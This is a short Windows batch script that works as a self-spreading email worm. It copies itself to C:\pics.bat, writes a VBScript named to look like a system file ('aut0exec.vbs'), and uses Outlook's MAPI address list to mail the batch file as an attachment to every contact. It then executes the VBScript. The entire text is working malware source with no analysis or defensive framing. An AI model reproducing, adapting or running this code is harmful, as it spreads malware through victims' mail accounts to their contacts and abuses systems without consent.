copy %0 C:\pics.bat
copy %0 C:\aut0exec.vbs 
echo Dim x > C:\aut0exec.vbs 
echo.ON ERROR RESUME NEXT >> C:\aut0exec.vbs 
echo Set fso="Scripting.FileSystemObject" >> C:\aut0exec.vbs
echo Set so=CreateObject(fso) >> C:\aut0exec.vbs 
echo Set ol=CreateObject("Outlook.Application") >> C:\aut0exec.vbs 
echo Set out= WScript.CreateObject("Outlook.Application") >> C:\aut0exec.vbs 
echo Set mapi = out.GetNameSpace("MAPI") >> C:\aut0exec.vbs 
echo Set a = mapi.AddressLists(1) >> C:\aut0exec.vbs 
echo For x=1 To a.AddressEntries.Count >> C:\aut0exec.vbs 
echo Set Mail=ol.CreateItem(0) >> C:\aut0exec.vbs 
echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x) >> C:\aut0exec.vbs 
echo Mail.Subject="[none]" >> C:\aut0exec.vbs 
echo Mail.Body="" >> C:\aut0exec.vbs 
echo Mail.Attachments.Add("C:\pics.bat") >> C:\aut0exec.vbs 
echo Mail.Send >> C:\aut0exec.vbs 
echo Next >> C:\aut0exec.vbs 
echo ol.Quit >> C:\aut0exec.vbs 
cscript C:\aut0exec.vbs 